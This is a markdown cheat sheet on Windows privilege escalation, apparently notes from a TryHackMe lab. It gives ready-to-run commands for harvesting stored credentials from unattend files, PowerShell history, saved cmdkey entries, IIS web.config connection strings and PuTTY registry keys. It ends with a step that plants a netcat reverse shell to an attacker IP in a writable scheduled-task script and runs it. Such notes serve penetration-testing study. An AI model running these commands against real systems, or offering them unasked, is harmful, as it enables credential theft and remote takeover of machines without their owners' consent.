# Windows Privilege Escalation

* [Unattended Windows Installations](#unattended-windows-installations)
* [Powershell History](#powershell-history)
* [Saved Windows Credentials](#saved-windows-credentials)
* [Internet Information Services Configuration](#internet-information-services-configuration)
* [Retrieve Credentials from PuTTY](#retrieve-credentials-from-putty)
* [Scheduled Tasks](#scheduled-tasks)

*********************************************************************************
Items inside [SQUARE-BRACKETS] indicate changeable (fill in the blank) fields.  
Note: Bracket characters themselves [ ] require removal. See examples.
*********************************************************************************

## Unattended Windows Installations

Check these locations for credentials:

* C:\Unattend.xml
* C:\Windows\Panther\Unattend.xml
* C:\Windows\Panther\Unattend\Unattend.xml
* C:\Windows\system32\sysprep.inf
* C:\Windows\system32\sysprep\sysprep.xml

********************************************

## Powershell History
From Command Prompt:
```
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```
From PowerShell:
```
type $Env:userprofile\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

********************************************

## Saved Windows Credentials

List saved credentials:
```
cmdkey /list
```
While you can't see the actual passwords, if you notice any credentials worth trying, you can use them with the runas command and the /savecred option:
```
runas /savecred /user:admin cmd.exe
```

********************************************

## Internet Information Services Configuration
* (ISS)

Can find "web.config" in one of the following locations:
```
C:\inetpub\wwwroot\web.config
```
```
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
```
Quick way to find database connection strings on the file:
```
type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
```

********************************************

## Retrieve Credentials from PuTTY

Search under the following registry key for ProxyPassword:
```
reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
```

********************************************

## Scheduled Tasks

List scheduled tasks with this command:
```
schtasks
```
* Look for "Task to Run" and "Run as User"
* Look at file executable permissions with:
```
icacls [FILE-PATH]
```
* Look for (F) in BUILTIN\Users
* Echo payload into file example:
```
echo c:\tools\nc64.exe -e cmd.exe [ATTACK-IP] [PORT] > C:\tasks\schtask.bat
```
* Start a listener on attack machine
* Run the task:
```
schtasks /run /tn [TASK-NAME]
```
Check to see if the reverse shell connected

********************************************

### Reference:
* https://tryhackme.com/room/windowsprivesc20
